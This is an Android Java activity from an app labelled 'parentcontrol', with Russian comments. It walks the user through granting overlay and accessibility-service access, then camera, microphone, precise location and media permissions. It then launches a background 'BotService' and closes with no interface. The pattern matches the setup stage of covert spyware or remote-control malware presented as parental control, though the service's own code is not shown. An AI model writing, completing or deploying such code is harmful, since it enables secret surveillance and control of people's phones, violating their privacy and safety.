package com.parentcontrol;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {

    private static final int PERM_REQUEST = 1;
    private static final int OVERLAY_REQUEST = 2;
    private static final int ACCESSIBILITY_REQUEST = 3;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // Шаг 1: Разрешение поверх экрана
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
            Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                Uri.parse("package:" + getPackageName()));
            startActivityForResult(intent, OVERLAY_REQUEST);
            return;
        }

        // Шаг 2: Спец. возможности
        if (!isAccessibilityEnabled()) {
            startActivityForResult(
                new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS),
                ACCESSIBILITY_REQUEST
            );
            return;
        }

        // Шаг 3: Обычные разрешения
        String[] perms = getRequiredPermissions();
        if (!hasPermissions(perms)) {
            ActivityCompat.requestPermissions(this, perms, PERM_REQUEST);
            return;
        }

        startAndFinish();
    }

    private boolean isAccessibilityEnabled() {
        try {
            String services = Settings.Secure.getString(
                getContentResolver(),
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            return services != null && services.contains(getPackageName());
        } catch (Exception e) {
            return false;
        }
    }

    private String[] getRequiredPermissions() {
        List<String> perms = new ArrayList<>();
        perms.add(Manifest.permission.CAMERA);
        perms.add(Manifest.permission.RECORD_AUDIO);
        perms.add(Manifest.permission.ACCESS_FINE_LOCATION);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            perms.add(Manifest.permission.READ_MEDIA_IMAGES);
            perms.add(Manifest.permission.READ_MEDIA_AUDIO);
            perms.add(Manifest.permission.READ_MEDIA_VIDEO);
        } else {
            perms.add(Manifest.permission.READ_EXTERNAL_STORAGE);
        }
        return perms.toArray(new String[0]);
    }

    private boolean hasPermissions(String[] permissions) {
        for (String perm : permissions) {
            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED)
                return false;
        }
        return true;
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        // После любого экрана настроек - продолжаем с onCreate
        recreate();
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] results) {
        super.onRequestPermissionsResult(requestCode, permissions, results);
        startAndFinish();
    }

    private void startAndFinish() {
        startForegroundService(new Intent(this, BotService.class));
        finish(); // Закрываем - никакого UI
    }
}
